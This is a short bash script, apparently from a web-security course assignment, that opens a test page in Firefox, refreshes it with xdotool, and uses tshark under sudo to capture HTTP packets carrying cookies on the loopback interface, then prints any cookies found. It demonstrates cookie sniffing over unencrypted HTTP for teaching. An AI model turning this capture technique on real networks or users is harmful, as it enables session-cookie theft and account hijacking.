#!/bin/bash
# To ensure user has sudo rights first.
sudo pwd

mkdir exploit06
touch exploit06/results.txt

echo "**** LOOK HERE ****"
echo "Please wait for the page in firefox to refresh before closing it..."
sleep 5

# Open the webpage in Firefox
gnome-terminal -x bash -c "sleep 1;firefox https://www.wsb.com/Assignment2/case06.php;exit"
# Force Firefox to refresh
gnome-terminal -x bash -c "sleep 8;WID=`xdotool search --name \"Mozilla Firefox\" | head -1`;xdotool windowactivate $WID;xdotool key F5;sleep 5s;xdotool key Ctrl+w;exit"
# Start tShark for 6 seconds and only capture packets with cookies
sudo tshark -i lo -Y http.cookie -V -a duration:15 > exploit06/results.txt
echo "Cookie found: "
cat exploit06/results.txt | grep Cookie